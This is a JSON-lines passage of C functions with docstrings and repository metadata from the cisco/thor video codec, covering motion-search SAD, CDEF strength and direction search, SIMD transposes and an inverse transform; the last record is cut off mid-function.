{"docstring": "/* Return the best approximated quarter-pel position around the centre using SIMD friendly averages */\n", "func_signal": "static unsigned int sad_calc_fastquarter(const SAMPLE *o, const SAMPLE *r, int os, int rs, int width, int height, int *x, int *y)", "code": "{\n  unsigned int tl = 0, tr = 0, br = 0, bl = 0, top = 0, right = 0, down = 0, left = 0;\n  int bestx = 0, besty = -1;\n\n  for (int i = 0; i < height; i++) {\n    for (int j = 0; j < width; j++) {\n\n      if (*x & *y) {\n        SAMPLE a = r[j];\n        SAMPLE d = r[j + 1];\n        SAMPLE e = r[j + rs + 1];\n        SAMPLE f = r[j + rs];\n        SAMPLE ad = (a + d + 1) >> 1;\n        SAMPLE de = (d + e + 1) >> 1;\n        SAMPLE af = (a + f + 1) >> 1;\n        SAMPLE fe = (f + e + 1) >> 1;\n\n        tl +=    abs(o[i*os+j] - ((ad + af) >> 1));\n        top +=   abs(o[i*os+j] - ((de +  a) >> 1));\n        tr +=    abs(o[i*os+j] - ((ad + de) >> 1));\n        left +=  abs(o[i*os+j] - ((ad +  f) >> 1));\n        right += abs(o[i*os+j] - ((ad +  e) >> 1));\n        bl +=    abs(o[i*os+j] - ((af + fe) >> 1));\n        down +=  abs(o[i*os+j] - ((de +  f) >> 1));\n        br +=    abs(o[i*os+j] - ((de + fe) >> 1));\n      } else if (*x) {\n        SAMPLE a = r[j];\n        SAMPLE b = r[j - rs];\n        SAMPLE c = r[j - rs + 1];\n        SAMPLE d = r[j + 1];\n        SAMPLE e = r[j + rs + 1];\n        SAMPLE f = r[j + rs];\n        SAMPLE ad = (a + d + 1) >> 1;\n        SAMPLE de = (d + e + 1) >> 1;\n        SAMPLE dc = (d + c + 1) >> 1;\n        SAMPLE af = (a + f + 1) >> 1;\n        SAMPLE ab = (a + b + 1) >> 1;\n\n        tl +=    abs(o[i*os+j] - ((ad + ab) >> 1));\n        top +=   abs(o[i*os+j] - ((dc +  a) >> 1));\n        tr +=    abs(o[i*os+j] - ((ad + dc) >> 1));\n        left +=  abs(o[i*os+j] - ((ad +  a) >> 1));\n        right += abs(o[i*os+j] - ((ad +  d) >> 1));\n        bl +=    abs(o[i*os+j] - ((ad + af) >> 1));\n        down +=  abs(o[i*os+j] - ((af +  d) >> 1));\n        br +=    abs(o[i*os+j] - ((ad + de) >> 1));\n      } else if (*y) {\n        SAMPLE a = r[j];\n        SAMPLE d = r[j + 1];\n        SAMPLE e = r[j + rs + 1];\n        SAMPLE f = r[j + rs];\n        SAMPLE g = r[j + rs - 1];\n        SAMPLE h = r[j - 1];\n        SAMPLE ad = (a + d + 1) >> 1;\n        SAMPLE af = (a + f + 1) >> 1;\n        SAMPLE fe = (f + e + 1) >> 1;\n        SAMPLE ah = (a + h + 1) >> 1;\n        SAMPLE gf = (g + f + 1) >> 1;\n\n        tl +=    abs(o[i*os+j] - ((ah + af) >> 1));\n        top +=   abs(o[i*os+j] - ((af +  a) >> 1));\n        tr +=    abs(o[i*os+j] - ((ad + af) >> 1));\n        left +=  abs(o[i*os+j] - ((gf +  a) >> 1));\n        right += abs(o[i*os+j] - ((ad +  f) >> 1));\n        bl +=    abs(o[i*os+j] - ((af + gf) >> 1));\n        down +=  abs(o[i*os+j] - ((af +  f) >> 1));\n        br +=    abs(o[i*os+j] - ((af + fe) >> 1));\n      } else {\n        SAMPLE a = r[j];\n        SAMPLE b = r[j - rs];\n        SAMPLE d = r[j + 1];\n        SAMPLE f = r[j + rs];\n        SAMPLE h = r[j - 1];\n        SAMPLE ad = (a + d + 1) >> 1;\n        SAMPLE af = (a + f + 1) >> 1;\n        SAMPLE ah = (a + h + 1) >> 1;\n        SAMPLE ab = (a + b + 1) >> 1;\n\n        tl +=    abs(o[i*os+j] - ((ah + ab) >> 1));\n        top +=   abs(o[i*os+j] - ((ab +  a) >> 1));\n        tr +=    abs(o[i*os+j] - ((ad + ab) >> 1));\n        left +=  abs(o[i*os+j] - ((ah +  a) >> 1));\n        right += abs(o[i*os+j] - ((ad +  a) >> 1));\n        bl +=    abs(o[i*os+j] - ((ah + af) >> 1));\n        down +=  abs(o[i*os+j] - ((af +  a) >> 1));\n        br +=    abs(o[i*os+j] - ((af + ad) >> 1));\n      }\n    }\n    r += rs;\n  }\n\n  if (tl < top) {\n    bestx = -1;\n    top = tl;\n  }\n  if (tr < top) {\n    bestx = 1;\n    top = tr;\n  }\n  if (left < top) {\n    bestx = -1;\n    besty = 0;\n    top = left;\n  }\n  if (right < top) {\n    bestx = 1;\n    besty = 0;\n    top = right;\n  }\n  if (bl < top) {\n    bestx = -1;\n    besty = 1;\n    top = bl;\n  }\n  if (down < top) {\n    bestx = 0;\n    besty = 1;\n    top = down;\n  }\n  if (br < top) {\n    bestx = 1;\n    besty = 1;\n    top = br;\n  }\n\n  *x = bestx;\n  *y = besty;\n  return top;\n}", "path": "thor/enc/encode_block.c", "commit_date": "2018-01-17 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Search for the set of strengths that minimizes mse. */\n", "func_signal": "static uint64_t joint_strength_search(int *best_lev, int nb_strengths,\n                                      uint64_t mse[][TOTAL_STRENGTHS],\n                                      int sb_count, int speed)", "code": "{\n  uint64_t best_tot_mse;\n  int i;\n  best_tot_mse = (uint64_t)1 << 63;\n  /* Greedy search: add one strength options at a time. */\n  for (i = 0; i < nb_strengths; i++) {\n    best_tot_mse = search_one(best_lev, i, mse, sb_count, speed);\n  }\n  /* Trying to refine the greedy search by reconsidering each\n     already-selected option. */\n  if (!speed) {\n    for (i = 0; i < 4 * nb_strengths; i++) {\n      int j;\n      for (j = 0; j < nb_strengths - 1; j++) best_lev[j] = best_lev[j + 1];\n      best_tot_mse =\n          search_one(best_lev, nb_strengths - 1, mse, sb_count, speed);\n    }\n  }\n  return best_tot_mse;\n}", "path": "thor/enc/encode_frame.c", "commit_date": "2018-01-17 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Computes cost for directions 0, 5, 6 and 7. We can call this function again\n   to compute the remaining directions. */\n", "func_signal": "v256 compute_directions(v256 lines[8], int32_t tmp_cost1[4])", "code": "{\n  v256 partial4a, partial4b, partial5a, partial5b, partial7a, partial7b;\n  v256 partial6;\n  v256 tmp;\n  /* Partial sums for lines 0 and 1. */\n  partial4a = v256_shl_n_word(lines[0], 14);\n  partial4b = v256_shr_n_word(lines[0], 2);\n  partial4a = v256_add_32(partial4a, v256_shl_n_word(lines[1], 12));\n  partial4b = v256_add_32(partial4b, v256_shr_n_word(lines[1], 4));\n  tmp = v256_add_32(lines[0], lines[1]);\n  partial5a = v256_shl_n_word(tmp, 10);\n  partial5b = v256_shr_n_word(tmp, 6);\n  partial7a = v256_shl_n_word(tmp, 4);\n  partial7b = v256_shr_n_word(tmp, 12);\n  partial6 = tmp;\n\n  /* Partial sums for lines 2 and 3. */\n  partial4a = v256_add_32(partial4a, v256_shl_n_word(lines[2], 10));\n  partial4b = v256_add_32(partial4b, v256_shr_n_word(lines[2], 6));\n  partial4a = v256_add_32(partial4a, v256_shl_n_word(lines[3], 8));\n  partial4b = v256_add_32(partial4b, v256_shr_n_word(lines[3], 8));\n  tmp = v256_add_32(lines[2], lines[3]);\n  partial5a = v256_add_32(partial5a, v256_shl_n_word(tmp, 8));\n  partial5b = v256_add_32(partial5b, v256_shr_n_word(tmp, 8));\n  partial7a = v256_add_32(partial7a, v256_shl_n_word(tmp, 6));\n  partial7b = v256_add_32(partial7b, v256_shr_n_word(tmp, 10));\n  partial6 = v256_add_32(partial6, tmp);\n\n  /* Partial sums for lines 4 and 5. */\n  partial4a = v256_add_32(partial4a, v256_shl_n_word(lines[4], 6));\n  partial4b = v256_add_32(partial4b, v256_shr_n_word(lines[4], 10));\n  partial4a = v256_add_32(partial4a, v256_shl_n_word(lines[5], 4));\n  partial4b = v256_add_32(partial4b, v256_shr_n_word(lines[5], 12));\n  tmp = v256_add_32(lines[4], lines[5]);\n  partial5a = v256_add_32(partial5a, v256_shl_n_word(tmp, 6));\n  partial5b = v256_add_32(partial5b, v256_shr_n_word(tmp, 10));\n  partial7a = v256_add_32(partial7a, v256_shl_n_word(tmp, 8));\n  partial7b = v256_add_32(partial7b, v256_shr_n_word(tmp, 8));\n  partial6 = v256_add_32(partial6, tmp);\n\n  /* Partial sums for lines 6 and 7. */\n  partial4a = v256_add_32(partial4a, v256_shl_n_word(lines[6], 2));\n  partial4b = v256_add_32(partial4b, v256_shr_n_word(lines[6], 14));\n  partial4a = v256_add_32(partial4a, lines[7]);\n  tmp = v256_add_32(lines[6], lines[7]);\n  partial5a = v256_add_32(partial5a, v256_shl_n_word(tmp, 4));\n  partial5b = v256_add_32(partial5b, v256_shr_n_word(tmp, 12));\n  partial7a = v256_add_32(partial7a, v256_shl_n_word(tmp, 10));\n  partial7b = v256_add_32(partial7b, v256_shr_n_word(tmp, 6));\n  partial6 = v256_add_32(partial6, tmp);\n\n  /* Compute costs in terms of partial sums. */\n  partial4a =\n      fold_mul_and_sum(partial4a, partial4b, v256_from_v64(210, 280, 420, 840),\n                       v256_from_v64(105, 120, 140, 168));\n  partial7a =\n      fold_mul_and_sum(partial7a, partial7b, v256_from_v64(210, 420, 0, 0),\n                       v256_from_v64(105, 105, 105, 140));\n  partial5a =\n      fold_mul_and_sum(partial5a, partial5b, v256_from_v64(210, 420, 0, 0),\n                       v256_from_v64(105, 105, 105, 140));\n  partial6 = v256_madd_s32(partial6, partial6);\n  partial6 = v256_mullo_s64(partial6, v256_dup_64(105));\n\n  partial4a = hsum4(partial4a, partial5a, partial6, partial7a);\n  v256_store_unaligned(tmp_cost1, partial4a);\n  return partial4a;\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Return the best approximated half-pel position around the centre using SIMD friendly averages */\n", "func_signal": "static unsigned int sad_calc_fasthalf(const SAMPLE *a, const SAMPLE *b, int astride, int bstride, int width, int height, int *x, int *y)", "code": "{\n  unsigned int tl = 0, tr = 0, br = 0, bl = 0, top = 0, right = 0, down = 0, left = 0;\n  int bestx = 0, besty = -2;\n\n  for (int i = 0; i < height; i++) {\n    for (int j = 0; j < width; j++) {\n      int ptl, ptr, pbr, pbl;\n\n      int t1, t2, t3, t4, t5, t6, t7, t8;\n      t1 = (b[-bstride+j-1] + b[-bstride+j] + 1) >> 1;\n      t2 = (b[j-1] + b[j] + 1) >> 1;\n      t1 = (t1 + t2) >> 1;\n      t3 = (b[-2*bstride+j-1] + b[bstride+j-1] + 1) >> 1;\n      t4 = (b[-2*bstride+j] + b[bstride+j] + 1) >> 1;\n      t3 = (t3 + t4) >> 1;\n      t5 = (b[-bstride+j-2] + b[-bstride+j+1] + 1) >> 1;\n      t6 = (b[j-2] + b[j+1] + 1) >> 1;\n      t5 = (t5 + t6) >> 1;\n      t5 = (t3 + t5) >> 1;\n      ptl = (t5 + t1) >> 1;\n      left += abs(a[i*astride+j] - t2);\n\n      t1 = (b[-bstride+j] + b[-bstride+j+1] + 1) >> 1;\n      t8 = (b[j] + b[j+1] + 1) >> 1;\n      t1 = (t1 + t8) >> 1;\n      t5 = (b[-2*bstride+j+1] + b[bstride+j+1] + 1) >> 1;\n      t3 = (t4 + t5) >> 1;\n      t4 = (b[-bstride+j-1] + b[-bstride+j+2] + 1) >> 1;\n      t7 = (b[j-1] + b[j+2] + 1) >> 1;\n      t5 = (t7 + t4) >> 1;\n      t5 = (t3 + t5) >> 1;\n      ptr = (t5 + t1) >> 1;\n      right += abs(a[i*astride+j] - t8);\n\n      t1 = (b[bstride+j-1] + b[bstride+j] + 1) >> 1;\n      t3 = (t1 + t2) >> 1;\n      t2 = (b[-bstride+j-1] + b[2*bstride+j-1] + 1) >> 1;\n      t4 = (b[-bstride+j] + b[2*bstride+j] + 1) >> 1;\n      t5 = (t4 + t2) >> 1;\n      t1 = (b[bstride+j-2] + b[bstride+j+1] + 1) >> 1;\n      t2 = (t6 + t1) >> 1;\n      t2 = (t5 + t2) >> 1;\n      pbl = (t2 + t3) >> 1;\n\n      t2 = (b[bstride+j] + b[bstride+j+1] + 1) >> 1;\n      t3 = (t8 + t2) >> 1;\n      t5 = (b[-bstride+j+1] + b[2*bstride+j+1] + 1) >> 1;\n      t6 = (t4 + t5) >> 1;\n      t8 = (b[bstride+j-1] + b[bstride+j+2] + 1) >> 1;\n      t1 = (t7 + t8) >> 1;\n      t2 = (t6 + t1) >> 1;\n      pbr = (t2 + t3) >> 1;\n\n      down += abs(a[i*astride+j] - ((b[j] + b[j+bstride] + 1) >> 1));\n      top += abs(a[i*astride+j] - ((b[j] + b[j-bstride] + 1) >> 1));\n      tl += abs(a[i*astride+j] - ptl);\n      tr += abs(a[i*astride+j] - ptr);\n      br += abs(a[i*astride+j] - pbr);\n      bl += abs(a[i*astride+j] - pbl);\n    }\n    b += bstride;\n  }\n\n  if (down < top) {\n    besty = 2;\n    top = down;\n  }\n\n  if (right < top) {\n    bestx = 2;\n    besty = 0;\n    top = right;\n  }\n\n  if (left < top) {\n    bestx = -2;\n    besty = 0;\n    top = left;\n  }\n\n  if (tl < top) {\n    bestx = -2;\n    besty = -2;\n    top = tl;\n  }\n\n  if (tr < top) {\n    bestx = 2;\n    besty = -2;\n    top = tr;\n  }\n\n  if (br < top) {\n    bestx = 2;\n    besty = 2;\n    top = br;\n  }\n\n  if (bl < top) {\n    bestx = -2;\n    besty = 2;\n    top = bl;\n  }\n\n  *x = bestx;\n  *y = besty;\n  return top;\n}", "path": "thor/enc/encode_block.c", "commit_date": "2018-01-17 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Detect direction. 0 means 45-degree up-right, 2 is horizontal, and so on.\n   The search minimizes the weighted variance along all the lines in a\n   particular direction, i.e. the squared error between the input and a\n   \"predicted\" block where each pixel is replaced by the average along a line\n   in a particular direction. Since each direction have the same sum(x^2) term,\n   that term is never computed. See Section 2, step 2, of:\n   http://jmvalin.ca/notes/intra_paint.pdf */\n", "func_signal": "int TEMPLATE(cdef_find_dir)(const SAMPLE *img, int stride, int32_t *var, int coeff_shift)", "code": "{\n  int i;\n  int32_t cost[8] = { 0 };\n  int partial[8][15] = { { 0 } };\n  int32_t best_cost = 0;\n  int best_dir = 0;\n  /* Instead of dividing by n between 2 and 8, we multiply by 3*5*7*8/n.\n     The output is then 840 times larger, but we don't care for finding\n     the max. */\n  static const int div_table[] = { 0, 840, 420, 280, 210, 168, 140, 120, 105 };\n  for (i = 0; i < 8; i++) {\n    int j;\n    for (j = 0; j < 8; j++) {\n      int x;\n      /* We subtract 128 here to reduce the maximum range of the squared\n         partial sums. */\n      x = (img[i * stride + j] >> coeff_shift) - 128;\n      partial[0][i + j] += x;\n      partial[1][i + j / 2] += x;\n      partial[2][i] += x;\n      partial[3][3 + i - j / 2] += x;\n      partial[4][7 + i - j] += x;\n      partial[5][3 - i / 2 + j] += x;\n      partial[6][j] += x;\n      partial[7][i / 2 + j] += x;\n    }\n  }\n  for (i = 0; i < 8; i++) {\n    cost[2] += partial[2][i] * partial[2][i];\n    cost[6] += partial[6][i] * partial[6][i];\n  }\n  cost[2] *= div_table[8];\n  cost[6] *= div_table[8];\n  for (i = 0; i < 7; i++) {\n    cost[0] += (partial[0][i] * partial[0][i] +\n                partial[0][14 - i] * partial[0][14 - i]) *\n               div_table[i + 1];\n    cost[4] += (partial[4][i] * partial[4][i] +\n                partial[4][14 - i] * partial[4][14 - i]) *\n               div_table[i + 1];\n  }\n  cost[0] += partial[0][7] * partial[0][7] * div_table[8];\n  cost[4] += partial[4][7] * partial[4][7] * div_table[8];\n  for (i = 1; i < 8; i += 2) {\n    int j;\n    for (j = 0; j < 4 + 1; j++) {\n      cost[i] += partial[i][3 + j] * partial[i][3 + j];\n    }\n    cost[i] *= div_table[8];\n    for (j = 0; j < 4 - 1; j++) {\n      cost[i] += (partial[i][j] * partial[i][j] +\n                  partial[i][10 - j] * partial[i][10 - j]) *\n                 div_table[2 * j + 2];\n    }\n  }\n  for (i = 0; i < 8; i++) {\n    if (cost[i] > best_cost) {\n      best_cost = cost[i];\n      best_dir = i;\n    }\n  }\n  /* Difference between the optimal variance and the variance along the\n     orthogonal direction. Again, the sum(x^2) terms cancel out. */\n  *var = best_cost - cost[(best_dir + 4) & 7];\n  /* We'd normally divide by 840, but dividing by 1024 is close enough\n     for what we're going to do with this. */\n  *var >>= 10;\n  return best_dir;\n}", "path": "thor/common/common_block.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Search for the set of luma+chroma strengths that minimizes mse. */\n", "func_signal": "static uint64_t joint_strength_search_dual(int *best_lev0, int *best_lev1,\n                                           int nb_strengths,\n                                           uint64_t (**mse)[TOTAL_STRENGTHS],\n                                           int sb_count, int speed)", "code": "{\n  uint64_t best_tot_mse;\n  int i;\n  best_tot_mse = (uint64_t)1 << 63;\n  /* Greedy search: add one strength options at a time. */\n  for (i = 0; i < nb_strengths; i++) {\n    best_tot_mse =\n        search_one_dual(best_lev0, best_lev1, i, mse, sb_count, speed);\n  }\n  /* Trying to refine the greedy search by reconsidering each\n     already-selected option. */\n  for (i = 0; i < 4 * nb_strengths; i++) {\n    int j;\n    for (j = 0; j < nb_strengths - 1; j++) {\n      best_lev0[j] = best_lev0[j + 1];\n      best_lev1[j] = best_lev1[j + 1];\n    }\n    best_tot_mse = search_one_dual(best_lev0, best_lev1, nb_strengths - 1, mse,\n                                   sb_count, speed);\n  }\n  return best_tot_mse;\n}", "path": "thor/enc/encode_frame.c", "commit_date": "2018-01-17 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Search for the best luma+chroma strength to add as an option, knowing we\n   already selected nb_strengths options. */\n", "func_signal": "static uint64_t search_one_dual(int *lev0, int *lev1, int nb_strengths,\n                                uint64_t (**mse)[TOTAL_STRENGTHS], int sb_count,\n                                int speed)", "code": "{\n  uint64_t tot_mse[TOTAL_STRENGTHS][TOTAL_STRENGTHS];\n  int i, j;\n  uint64_t best_tot_mse = (uint64_t)1 << 63;\n  int best_id0 = 0;\n  int best_id1 = 0;\n  const int total_strengths = pristrengths[speed];\n  memset(tot_mse, 0, sizeof(tot_mse));\n  for (i = 0; i < sb_count; i++) {\n    int gi;\n    uint64_t best_mse = (uint64_t)1 << 63;\n    /* Find best mse among already selected options. */\n    for (gi = 0; gi < nb_strengths; gi++) {\n      uint64_t curr = mse[0][i][lev0[gi]];\n      curr += mse[1][i][lev1[gi]];\n      if (curr < best_mse) {\n        best_mse = curr;\n      }\n    }\n    /* Find best mse when adding each possible new option. */\n    for (j = 0; j < total_strengths; j++) {\n      int k;\n      for (k = 0; k < total_strengths; k++) {\n        uint64_t best = best_mse;\n        uint64_t curr = mse[0][i][j];\n        curr += mse[1][i][k];\n        if (curr < best) best = curr;\n        tot_mse[j][k] += best;\n      }\n    }\n  }\n  for (j = 0; j < total_strengths; j++) {\n    int k;\n    for (k = 0; k < total_strengths; k++) {\n      if (tot_mse[j][k] < best_tot_mse) {\n        best_tot_mse = tot_mse[j][k];\n        best_id0 = j;\n        best_id1 = k;\n      }\n    }\n  }\n  lev0[nb_strengths] = best_id0;\n  lev1[nb_strengths] = best_id1;\n  return best_tot_mse;\n}", "path": "thor/enc/encode_frame.c", "commit_date": "2018-01-17 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* transpose and reverse the order of the lines -- equivalent to a 90-degree\n   counter-clockwise rotation of the pixels. */\n", "func_signal": "void array_reverse_transpose_8x8(v256 *in, v256 *res)", "code": "{\n  const v256 tr0_0 = v256_ziplo_32(in[1], in[0]);\n  const v256 tr0_1 = v256_ziplo_32(in[3], in[2]);\n  const v256 tr0_2 = v256_ziphi_32(in[1], in[0]);\n  const v256 tr0_3 = v256_ziphi_32(in[3], in[2]);\n  const v256 tr0_4 = v256_ziplo_32(in[5], in[4]);\n  const v256 tr0_5 = v256_ziplo_32(in[7], in[6]);\n  const v256 tr0_6 = v256_ziphi_32(in[5], in[4]);\n  const v256 tr0_7 = v256_ziphi_32(in[7], in[6]);\n\n  const v256 tr1_0 = v256_ziplo_64(tr0_1, tr0_0);\n  const v256 tr1_1 = v256_ziplo_64(tr0_5, tr0_4);\n  const v256 tr1_2 = v256_ziphi_64(tr0_1, tr0_0);\n  const v256 tr1_3 = v256_ziphi_64(tr0_5, tr0_4);\n  const v256 tr1_4 = v256_ziplo_64(tr0_3, tr0_2);\n  const v256 tr1_5 = v256_ziplo_64(tr0_7, tr0_6);\n  const v256 tr1_6 = v256_ziphi_64(tr0_3, tr0_2);\n  const v256 tr1_7 = v256_ziphi_64(tr0_7, tr0_6);\n\n  res[7] = v256_ziplo_128(tr1_1, tr1_0);\n  res[6] = v256_ziphi_128(tr1_1, tr1_0);\n  res[5] = v256_ziplo_128(tr1_3, tr1_2);\n  res[4] = v256_ziphi_128(tr1_3, tr1_2);\n  res[3] = v256_ziplo_128(tr1_5, tr1_4);\n  res[2] = v256_ziphi_128(tr1_5, tr1_4);\n  res[1] = v256_ziplo_128(tr1_7, tr1_6);\n  res[0] = v256_ziphi_128(tr1_7, tr1_6);\n}", "path": "thor/common/common_kernels_gen.c", "commit_date": "2018-07-16 00:00:00", "repo_name": "cisco/thor", "stars": 693, "license": "bsd-2-clause", "language": "c", "size": 1168}
{"docstring": "/* Inverse transform, take advantage of symmetries to minimise operations */\n", "func_signal": "static void inverse_transform8(const int32_t *coeff, int32_t *block, int bitdepth)", "code": "{\n  v256 t0, t1, t2, t3, t4 ,t5, t6, t7, t8, t9, t10, t11, t12, t13, t14, t15, t16;\n  v256 round = v256_dup_64(64);\n  int shift2 = 20 - bitdepth;\n  v256 c0  = v256_dup_32(64);\n  v256 c1  = v256_dup_64(-(64 << 16) |   64);\n  v256 c2  = v256_dup_64(  36 << 16  |   83);\n  v256 c3  = v256_dup_64(  83 << 16  | (-36 & 0xffff));\n  v256 c4  = v256_dup_64(  18 << 16  | (-75 & 0xffff));\n  v256 c5  = v256_dup_64(  50 << 16  | (-18 & 0xffff));\n  v256 c6  = v256_dup_64(-(89 << 16) |   50);\n  v256 c7  = v256_dup_64(  75 << 16  |   89);\n  v256 c8  = v256_dup_64(  50 << 16  |   89);\n  v256 c9  = v256_dup_64(  89 << 16  | (-75 & 0xffff));\n  v256 c10 = v256_dup_64(  75 << 16  |   18);\n  v256 c11 = v256_dup_64(  18 << 16  |   50);\n\n  v256 load0 = v256_load_aligned(coeff +  0);\n  v256 load1 = v256_load_aligned(coeff +  8);\n  v256 load2 = v256_load_aligned(coeff + 16);\n  v256 load3 = v256_load_aligned(coeff + 24);\n  v256 load4 = v256_load_aligned(coeff + 32);\n  v256 load5 = v256_load_aligned(coeff + 40);\n  v256 load6 = v256_load_aligned(coeff + 48);\n  v256 load7 = v256_load_aligned(coeff + 56);\n\n  t0 = v256_ziplo_32(load4, load0);\n  t1 = v256_ziplo_32(load6, load2);\n  t2 = v256_madd_s32(c0, t0);\n  t3 = v256_madd_s32(c2, t1);\n  t4 = v256_add_64(t2, t3);\n  t3 = v256_sub_64(t2, t3);\n\n  t2 = v256_ziphi_32(load4, load0);\n  t5 = v256_ziphi_32(load6, load2);\n  t6 = v256_madd_s32(c0, t2);\n  t7 = v256_madd_s32(c2, t5);\n  t8 = v256_add_64(t6, t7);\n  t6 = v256_sub_64(t6, t7);\n\n  t0 = v256_madd_s32(c1, t0);\n  t1 = v256_madd_s32(c3, t1);\n  t9 = v256_add_64(t0, t1);\n  t10 = v256_sub_64(t0, t1);\n\n  t0 = v256_madd_s32(c1, t2);\n  t1 = v256_madd_s32(c3, t5);\n  t2 = v256_add_64(t0, t1);\n  t5 = v256_sub_64(t0, t1);\n\n  t0 = v256_ziplo_32(load3, load1);\n  t1 = v256_ziplo_32(load7, load5);\n  t7 = v256_ziphi_32(load3, load1);\n  t11 = v256_ziphi_32(load7, load5);\n\n  t12 = v256_add_64(v256_madd_s32(c4, t0), v256_madd_s32(c8, t1));\n  t13 = v256_add_64(v256_madd_s32(c4, t7), v256_madd_s32(c8, t11));\n  t14 = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_sub_64( t5, t13), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_sub_64(t10, t12), round), 7));\n  t13 = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_add_64( t5, t13), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_add_64(t10, t12), round), 7));\n\n  t12 = v256_add_64(v256_madd_s32(c5, t0), v256_madd_s32(c9, t1));\n  t10 = v256_add_64(v256_madd_s32(c5, t7), v256_madd_s32(c9, t11));\n  t5  = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_sub_64(t6, t10), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_sub_64(t3, t12), round), 7));\n  t10 = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_add_64(t6, t10), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_add_64(t3, t12), round), 7));\n\n  t12 = v256_add_64(v256_madd_s32(c6, t0), v256_madd_s32(c10, t1));\n  t15 = v256_add_64(v256_madd_s32(c6, t7), v256_madd_s32(c10, t11));\n  t3  = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_add_64(t2, t15), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_add_64(t9, t12), round), 7));\n  t6  = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_sub_64(t2, t15), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_sub_64(t9, t12), round), 7));\n\n  t12 = v256_add_64(v256_madd_s32(c7, t0), v256_madd_s32(c11, t1));\n  t9  = v256_add_64(v256_madd_s32(c7, t7), v256_madd_s32(c11, t11));\n  t2  = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_add_64(t8,  t9), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_add_64(t4, t12), round), 7));\n  t9  = v256_pack_s64_s32(v256_shr_n_s64(v256_add_64(v256_sub_64(t8,  t9), round), 7),\n                          v256_shr_n_s64(v256_add_64(v256_sub_64(t4, t12), round), 7));\n\n  t0 = v256_ziplo_32(t14, t2);\n  t1 = v256_ziphi_32(t14, t2);\n\n  t2 = v256_ziplo_32(t5, t3);\n  t3 = v256_ziphi_32(t5, t3);\n  t4 = v256_ziplo_32(t6, t10);\n  t5 = v256_ziphi_32(t6, t10);\n  t6 = v256_ziplo_32(t9, t13);\n  t7 = v256_ziphi_32(t9, t13);\n\n  t8 = v256_ziphi_128(t2, t0);\n  t9 = v256_ziplo_128(t2, t0);\n  t0 = v256_unziplo_64(t8, t9);\n  t2 = v256_unziphi_64(t8, t9);\n\n  t8 = v256_ziphi_128(t3, t1);\n  t9 = v256_ziplo_128(t3, t1);\n  t1 = v256_unziplo_64(t8, t9);\n  t3 = v256_unziphi_64(t8, t9);\n\n  t8 = v256_ziphi_128(t6, t4);\n  t9 = v256_ziplo_128(t6, t4);\n  t4 = v256_unziplo_64(t8, t9);\n  t6 = v256_unziphi_64(t8, t9);\n\n  t8 = v256_ziphi_128(t7, t5);\n  t9 = v256_ziplo_128(t7, t5);\n  t5 = v256_unziplo_64(t8, t9);\n  t7 = v256_unziphi_64(t8, t9);\n\n  t8 = v256_ziplo_128(t2, t0);\n  t0 = v256_ziphi_128(t2, t0);\n  t2 = v256_ziplo_128(t3, t1);\n  t1 = v256_ziphi_128(t3, t1);\n  t3 = v256_ziplo_128(t6, t4);\n  t4 = v256_ziphi_128(t6, t4);\n  t6 = v256_ziplo_128(t7, t5);\n  t7 = v256_ziphi_128(t7, t5);\n  t9 = v256_ziplo_128(t3, t8);\n  t10 = v256_ziplo_128(t4, t0);\n  t11 = v256_ziplo_128(t6, t2);\n  t12 = v256_ziplo_128(t7, t1);\n  t13 = v256_ziphi_32(t11, t9);\n  t14 = v256_ziphi_32(t12, t10);\n\n  t0 = v256_ziphi_128(t4, t0);\n  t1 = v256_ziphi_128(t7, t1);\n  t2 = v256_ziphi_128(t6, t2);\n  t3 = v256_ziphi_128(t3, t8);\n  t4 = v256_ziphi_32(t0, t3);\n  t5 = v256_ziphi_32(t1, t2);\n\n  t6 = v256_madd_s32(c0, t13);\n  t7 = v256_madd_s32(c2, t14);\n  t8 = v256_add_64(t6, t7);\n  t6 = v256_sub_64(t6, t7);\n  t7 = v256_madd_s32(c1, t13);\n  t13 = v256_madd_s32(c3, t14);\n  t14 = v256_add_64(t7, t13);\n  t7 = v256_sub_64(t7, t13);\n\n  t9 = v256_ziplo_32(t11, t9);\n  t10 = v256_ziplo_32(t12, t10);\n  t11 = v256_madd_s32(c0, t9);\n  t12 = v256_madd_s32(c2, t10);\n  t13 = v256_add_64(t11, t12);\n  t12 = v256_sub_64(t11, t12);\n  t9 = v256_madd_s32(c1, t9);\n  t10 = v256_madd_s32(c3, t10);\n  t11 = v256_add_64(t9, t10);\n  t16 = v256_sub_64(t9, t10);\n\n  t9 = v256_ziplo_32(t0, t3);\n  t10 = v256_ziplo_32(t1, t2);\n\n  t2 = v256_add_64(v256_madd_s32(c4, t4), v256_madd_s32(c8, t5));\n  t3 = v256_add_64(v256_madd_s32(c5, t4), v256_madd_s32(c9, t5));\n  t15 = v256_add_64(v256_madd_s32(c6, t4), v256_madd_s32(c10, t5));\n  t5 = v256_add_64(v256_madd_s32(c7, t4), 